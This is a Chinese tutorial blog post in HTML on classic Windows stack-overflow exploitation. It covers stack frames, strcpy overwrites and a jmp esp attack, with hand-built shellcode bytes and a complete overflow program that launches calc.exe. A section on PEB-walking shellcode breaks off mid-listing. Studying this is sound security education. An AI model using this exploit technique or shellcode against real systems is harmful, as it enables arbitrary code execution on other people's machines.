@@ -1,0 +1,979 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hello! CytQ">
+    <title>通关栈溢出（一）：原理及初级攻击 - Hello! CytQ</title>
+    <meta name="author" content="CytQ">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <meta name="description" content="前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行 之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。 OS： Windows XP SP2, Window 7">
+<meta name="keywords" content="漏洞,通关,专栏">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="通关栈溢出（一）：原理及初级攻击">
+<meta property="og:url" content="http://imlzq.com/2018/08/07/stackOverFlow_1/index.html">
+<meta property="og:site_name" content="Hello! CytQ">
+<meta property="og:description" content="前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行 之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。 OS： Windows XP SP2, Window 7">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return_end.png">
+<meta property="og:updated_time" content="2018-08-23T12:51:21.575Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通关栈溢出（一）：原理及初级攻击">
+<meta name="twitter:description" content="前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行 之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。 OS： Windows XP SP2, Window 7">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return.png">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://imlzq.com/assets/images/headicon.png"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-pz4cc6y13wt2trzqa8l3n9v0yykr0sstdaheem7qj628nhjmhp9pfawvqawz.min.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Hello! CytQ</a>
+    </div>
+    
+        
+            <a  class="header-right-icon "
+                href="#about">
+        
+        
+            <i class="fa fa-lg fa-global.avatar"></i>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/headicon.png" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">CytQ</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Software Engineer<br>Android、移动安全、逆向、漏洞挖掘</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="Tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="Archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="Search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="About"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="mailto:cytlzq@gmail.com" target="_blank" rel="noopener" title="Mail">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post" itemscope itemType="http://schema.org/BlogPosting">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title" itemprop="headline">
+            通关栈溢出（一）：原理及初级攻击
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time itemprop="datePublished" datetime="2018-08-07T22:13:00+08:00">
+	
+		    Aug 07, 2018
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+    
+    <div class="post-content markdown" itemprop="articleBody">
+        <div class="main-content-wrap">
+            <p><strong>前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行</strong></p>
+<p>之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。</p>
+<p>OS： Windows XP SP2, Window 7</p>
+<p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p>
+<p>Book: 《0day安全：软件漏洞分析技术》</p>
+<p>知识点的主要来源是”0day安全：软件漏洞分析技术”和网络，但发现它内部80%漏洞利用代码均无法直接在自己的机器上运行。因此本通关专栏不会完全按书的内容规划，在必要的时候会自行实现</p>
+<a id="more"></a>    
+<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>每个进程都有一个独立的虚拟地址空间，这些虚拟地址空间在x86里被称为segment，例如Data Segment、Text Segment、stack、heap等等。</p>
+<blockquote>
+<p>Android中，进程里的虚拟地址空间是由vm_area_struct结构组成的。全局维护一个vm_area_struct链表，用于串联所有已分配的空间。当使用mmap申请一个内存空间时，就会找到进程中一块连续且符合大小的区域，创建一个vm_area_struct结构用于标识本区域块，然后将其链接到进程的vm_area_struct链表中。</p>
+</blockquote>
+<p>栈向上增长，底部为高字节，上部为底字节。</p>
+<h2 id="函数调用的汇编过程"><a href="#函数调用的汇编过程" class="headerlink" title="函数调用的汇编过程"></a>函数调用的汇编过程</h2><blockquote>
+<p>需要用到的关键词：</p>
+<p>EBP: 栈底指针</p>
+<p>ESP: 栈顶指针</p>
+<p>EIP：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行</p>
+</blockquote>
+<p><strong>目标函数：</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[] = <span class="string">"1234567"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>将目标函数需要的参数从右到左依次入栈。PUSH c, PUSH  b, PUSH a</li>
+<li>将函数的返回地址入栈，也就是执行完这个函数后应该执行的下一条指令的地址。</li>
+<li>跳转到目标代码块。2和3合为CALL指令。CALL address of func</li>
+<li>调用方的栈顶属于被调用方的栈底，因此保存该信息，便于接下来分配新的栈帧供func使用。 MOV  ebp, esp,    PUSH ebp</li>
+<li>抬高栈帧.  SUB esp, 0x40.    这也就是给函数分配内存空间，0x40是根据目标函数func的局部变量确定的（程序在链接-编译-汇编的过程中就已生成了size，解析值即可），这里只是示例。</li>
+<li>创建局部变量，4个字节为一组。buf[8]因此会被分为两部分： buf[4~7], buf[0~3]</li>
+<li>do something</li>
+<li>程序执行完毕，还原调用环境，也就是各寄存器的值。降低esp，也就是释放之前分配的栈帧资源。 add esp, 0x40</li>
+<li>程序的最后一行，是RETN，也就是返回。从CPU从EIP中取出下一条指令的内存地址然后执行，这样就完成了函数调用的回溯</li>
+</ol>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>在上面的1~6步完成后，栈的结构应该是这样的。</p>
+<p><strong>高地址在下，低地址在上</strong></p>
+<table>
+<thead>
+<tr>
+<th>buf[0~3]</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>buf[4~7]</td>
+</tr>
+<tr>
+<td>ebp</td>
+</tr>
+<tr>
+<td>Return Address</td>
+</tr>
+<tr>
+<td>Param a</td>
+</tr>
+<tr>
+<td>Param b</td>
+</tr>
+<tr>
+<td>Param c</td>
+</tr>
+</tbody>
+</table>
+<p>从函数调用的过程来说，函数执行完毕后执行的下一个指令地址就是ReturnAddress。</p>
+<p>如果我们想让程序在执行完func后跑去执行我们自己构造的恶意代码，只需修改ReturnAddress的值即可。</p>
+<blockquote>
+<p>以前的流程是： main-&gt;func-&gt;main</p>
+<p>修改func的返回值后：main-&gt;func-&gt;shellcode</p>
+</blockquote>
+<p>C允许开发者直接对内存中的某个地址做修改，它本身也存在内存不安全函数。常见的如：gets、strcpy、strcat、scanf等。</p>
+<p>func使用strcpy将name中的所有内容全拷贝到buf中，如果name的内容超过buf的大小，那么接下来的内容就会覆盖掉buf下面的ebp、return address等。如果我们让name中先存放12字节的任意数据（buf占8个字节，ebp占4个字节），那么name[13~16]就会覆盖掉Return address，当func返回值EIP指向的就是name[13~16]的地址了。</p>
+<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>即恶意代码。指攻击者用于实时攻击的一段指令，指令的形式不限，不管是高级语言Java、Python，或者是汇编、机器指令，均可称作Shellcode。</p>
+<p>本文的栈溢出，因为是直接将恶意代码插入到栈当中，在程序返回时恶意执行，没有将代码解析和转换成机器指令的流程，因此需要直接存入机器指令。</p>
+<p>本文生成Shellcode的方法如下：</p>
+<ol>
+<li>编写汇编</li>
+<li>使用UltraEdit或者AsmToE 将汇编转为机器指令</li>
+<li>通过在机器指令码首部插入  \x 的方式将所有指令串联起来</li>
+</ol>
+<blockquote>
+<p><strong>例如：</strong></p>
+<p>机器指令为  83 EC 50，</p>
+<p>对应的汇编为sub esp,50h</p>
+<p>Shellcode为\x83\EC\50</p>
+</blockquote>
+<p><strong>TIPS：</strong></p>
+<p>在生成Shellcode时，需要按照漏洞的类型仔细配置.</p>
+<p>例如本文的攻击面是strcpy，而strcpy有个特性，一旦读取的字符串中包含00，就认为这个字符串的读取已经结束了。因此我们本次的Shellcode一定不能出现00的机器码。对于memcpy命令来说，就不存在这个问题</p>
+<h2 id="一、攻击：指定Shellcode的地址"><a href="#一、攻击：指定Shellcode的地址" class="headerlink" title="一、攻击：指定Shellcode的地址"></a>一、攻击：指定Shellcode的地址</h2><p>上文说到，将func的ReturnAddress替换为Shellcode在内存中的地址即可正确执行代码。那如何获取Shellcod在内存中的地址呢？</p>
+<p><strong>分两种情况：</strong></p>
+<ol>
+<li>只考虑本地环境</li>
+<li>通用环境。即所有的windows都能跳转到Shellcode的首地址。</li>
+</ol>
+<p>先分析我们的攻击代码，它由两部分构成。</p>
+<p>一部分是覆盖代码A，用于覆盖buf的所有空间以及EBP（这一块其实并不算Shellcode）</p>
+<p>另一部分就是Shellcode，它的首部地址就是我们的目标。</p>
+<p>A可以完全或部分包含Shellcode，也可以将shellcode排列在A之后。</p>
+<p>获取Shellcode的地址有两个方法，一个是直接打印，一个是使用调试工具ida pro、ollydbg动态调试。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shellcode在A之后</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, size of buf + <span class="number">4</span>); <span class="comment">// 最后的加4是EBP的4个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode在A之间</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, name + shellcode相对于A头部的偏移);</span><br></pre></td></tr></table></figure>
+<p>因为只考虑本地环境这种攻击方法兼容性太差，因此代码就不贴上来了，直接介绍下面的第二种攻击方式。jmp esp</p>
+<h2 id="二、攻击：JMP-esp"><a href="#二、攻击：JMP-esp" class="headerlink" title="二、攻击：JMP esp"></a>二、攻击：JMP esp</h2><table>
+<thead>
+<tr>
+<th>函数返回时栈中的情况</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Return Address</td>
+</tr>
+<tr>
+<td>Param a</td>
+</tr>
+<tr>
+<td>Param b</td>
+</tr>
+</tbody>
+</table>
+<p>当我们使用ollydbg调试函数返回的情况，栈内的情况如上图。之前已经分配的buf和ebp已被弹出。只剩返回值地址，函数的入参a、b、c</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return.png" alt="指向RETN"></p>
+<p>此时，函数还未返回，ESP指向0013FF84，也就是返回后程序会从13FF84取出地址7C961EED去执行 jmp esp.</p>
+<p>而当我们手动点击下一步，此时esp的值就变为了0013FF88。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return_end.png" alt="下一步"></p>
+<p><strong>这说明什么呢？</strong></p>
+<p>说明不管程序如何返回，在执行完RETN后ESP一定会指向ReturnAddress的下一个地址。本文也就是指向Param a的地址。我们可以先让Shellcode从Param a的位置开始填充，再让ReturnAddress跳转的地址指向一个jmp esp命令，那么此时再点击单步执行，那么程序就会从ESP所指向的地址中取值并执行，这样也就跳转到我们的Shellcode了</p>
+<p>因此整体的攻击流程就可以变更为：</p>
+<ol>
+<li>任意非00的指令覆盖buffer和EBP</li>
+<li>从程序已经加载的dll中获取他们的jmp esp指令地址。</li>
+<li>使用jmp esp的指令地址覆盖ReturnAddress</li>
+<li>从下一行开始填充Shellcode</li>
+</ol>
+<p>获取jmp esp地址的方法为：</p>
+<blockquote>
+<ul>
+<li><p>打开windbg，File-&gt;attach a process. </p>
+</li>
+<li><p>lm 指令查看现在加载了哪些库，获取它的start地址和end地址。对于win32程序而言，他们都会加载kernel32.dll和ntdll.dll</p>
+</li>
+<li><p>jmp esp的机器码为 FF E4。 使用指令：  s start地址 end地址 FF E4   即可查看库中包含jmp esp的地址address。</p>
+</li>
+<li>u address 指令可以查看该地址处的汇编，检验是否是jmp esp</li>
+<li>校验无误后保存备用</li>
+</ul>
+</blockquote>
+<p>获取jmp esp后，我们需要用16进制表示它。这里有个小tips，因为windows操作系统是小端显示，那么对应的16进制就应该反着写。</p>
+<p>例如，我们通过windbg获得的jmp esp地址为7c961eed，那么它的16进制就是0xed1e967c，即两位一组，反着写。</p>
+<p><strong>编写Shellcode</strong></p>
+<p>接下来，我们就可以开始编写Shellcode。编写Shellcode有多种方式，最快捷的是使用metasploit直接生成payload。本文用弹出一个计算器作为示例。</p>
+<p>在C中，如果我们要弹出一个计算器，代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LoadLibrary(<span class="string">"kernel32.dll"</span>);</span><br><span class="line">    WinExec(<span class="string">"calc.exe"</span>, <span class="number">0</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先我们需要载入kernel32.dll（win32默认已载入，这里仅作演示，实际可删除做这行代码），然后调用它WinExec这个方法，传入两个参，一个参是0，一个参是”calc.exe”。之后调用ExitProcess，传入参数0，退出程序。</p>
+<p><strong>获取LoadLibrary和ExitProcess在内存中的地址</strong></p>
+<p>LoadLibrary和ExitProcess属于kernel32.dll的功能，kernel32.dll在程序启动时就已默认加载，那么只需从内存中获得这两个方法的地址即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcLoad;</span><br><span class="line">		MYPROC ProcExit;</span><br><span class="line">		MYPROC ProcBox;</span><br><span class="line">		MYPROC ProcWinExec;</span><br><span class="line"></span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">"kernel32"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"kernel32 = 0x%x\n"</span>, LibHandle);</span><br><span class="line"></span><br><span class="line">        ProcLoad=(MYPROC)GetProcAddress(LibHandle,<span class="string">"LoadLibraryA"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"LoadLibraryA = 0x%x\n"</span>, ProcLoad);</span><br><span class="line">		ProcExit=(MYPROC)GetProcAddress(LibHandle,<span class="string">"ExitProcess"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ExitProcess = 0x%x\n"</span>, ProcExit);</span><br><span class="line">		ProcWinExec = (MYPROC)GetProcAddress(LibHandle, <span class="string">"WinExec"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"WinExec = 0x%x\n"</span>, ProcWinExec);</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		LibHandle = LoadLibrary(<span class="string">"user32"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"user32 = 0x%x\n"</span>, LibHandle);</span><br><span class="line">		ProcBox=(MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"MessageBoxA = 0x%x\n"</span>, ProcBox);</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>保存关键他们的地址，接着就是编写汇编去调用这两个方法了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sub esp,<span class="number">0x40</span>        <span class="comment">// 抬高栈帧</span></span><br><span class="line">xor ebx,ebx         <span class="comment">// 清空ebx </span></span><br><span class="line">push ebx			<span class="comment">// ebx入栈，00000000 作为字符的截断</span></span><br><span class="line">push <span class="number">0x6578652E</span>     <span class="comment">// “calc.exe”将字符串转为16进制为 63616c632e657865</span></span><br><span class="line">push <span class="number">0x636C6163</span>     <span class="comment">// 8个一组，不足的用20补齐。因为是小端显示，因此从后向前填写，注意push的顺序</span></span><br><span class="line">mov eax,esp         <span class="comment">// 在字符串入栈完毕后，esp指向字符串的起始位置. 此时eax = calc.exe</span></span><br><span class="line">push ebx            <span class="comment">// 参数入栈，0</span></span><br><span class="line">push eax            <span class="comment">// 参数入栈,calc.exe</span></span><br><span class="line">mov ecx,<span class="number">0x7C86114D</span>  <span class="comment">// 0x7C86114D为WinExec在内存中的地址</span></span><br><span class="line">call ecx            <span class="comment">// WinExec("calc.exe", 0);</span></span><br><span class="line">xor ebx,ebx        </span><br><span class="line">push ebx           <span class="comment">// 参数入栈</span></span><br><span class="line">mov eax,<span class="number">0x7C81CAA2</span> <span class="comment">// 0x7C81CAA2为ExitProcess在内存中的地址</span></span><br><span class="line">call eax           <span class="comment">// ExitProcess(0);</span></span><br></pre></td></tr></table></figure>
+<p>将这段汇编拖入AsmToE，获取机器码，并用\x替换空格。</p>
+<p><strong>Shellcode和完整代码如下：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\x41\x41\x41\x41\x41\x41\x41\x41"</span>  <span class="comment">// name[0]~name[7]</span></span><br><span class="line">     <span class="string">"\x41\x41\x41\x41"</span>                      <span class="comment">// Overlap EBP</span></span><br><span class="line">     <span class="string">"\xed\x1e\x96\x7c"</span>                        <span class="comment">// Return Address(Address of "Jmp eax")</span></span><br><span class="line">  <span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span> <span class="comment">// shellcode</span></span><br><span class="line"><span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line"><span class="string">"\xDB\x53"</span></span><br><span class="line"><span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line"><span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line"><span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, name);</span><br><span class="line">    <span class="comment">//printf("%s",buffer);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>攻击二中，LoadLibrary、WinExec、ExitProcess的地址是我们手动获取的，这意味着这个溢出shellcode在不同的操作系统上均需要重新获取对应的地址方可使用，有办法可以编写通用脚本吗？</p>
+<h2 id="三、攻击：编写系统版本通用的Shellcode"><a href="#三、攻击：编写系统版本通用的Shellcode" class="headerlink" title="三、攻击：编写系统版本通用的Shellcode"></a>三、攻击：编写系统版本通用的Shellcode</h2><p>这里的内容太多，今天写不完，先提交代码和原理，细节以后再补。</p>
+<p><strong>原理：</strong></p>
+<p>所有的win32程序都会加载ntdll.dll和kernel32.dll，如果要定位kernel32.dll中的API地址，可以用如下方法：</p>
+<ol>
+<li>首先通过段选择字FS在内存中找到当前的线程环境块TEB</li>
+<li>线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针</li>
+<li>进程环境块PEB中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针，其中存放着已经被进程装载的动态链接库的信息。</li>
+<li>PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针。</li>
+<li>模块初始化链表按顺序存放着PE装入运行时初始化模块的信息，第一个链表节点是ntdll.dll，第二个节点就是kernel32.dll</li>
+<li>找到kernel32.dll节点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。</li>
+<li>从kernel32.dll的加载基址算起，偏移0x3C的地方就是其PE头</li>
+<li>PE头偏移0x78的地方存放着指向函数导出表的指针</li>
+<li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。<ol>
+<li>导出表偏移0x1C处的指针指向存储导出函数偏移地址（RVA）的列表</li>
+<li>导出表偏移0x20处的指针指向存储导出函数名的列表</li>
+<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA</li>
+<li>获得RVA后，再加上前边已经得到的动态链接库的基地址，就能算出API此时在内存中的绝对地址</li>
+</ol>
+</li>
+</ol>
+<p>简而言之就是，顺着这条线理下来，定位dll中函数导出表的位置，拿到它的导出函数名列表，做hash比较，比较成功后从RVA中获取它的地址，再加上dll的基址就能得到函数在内存中的绝对地址。</p>
+<p><strong>代码如下：</strong>（我的那份忘保存，这里直接上传0day安全的备用代码，但在我本地是不可运行的，需要修改）</p>
+<p>复制_asm包裹的汇编，拖入AsmToE转换为机器指令即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 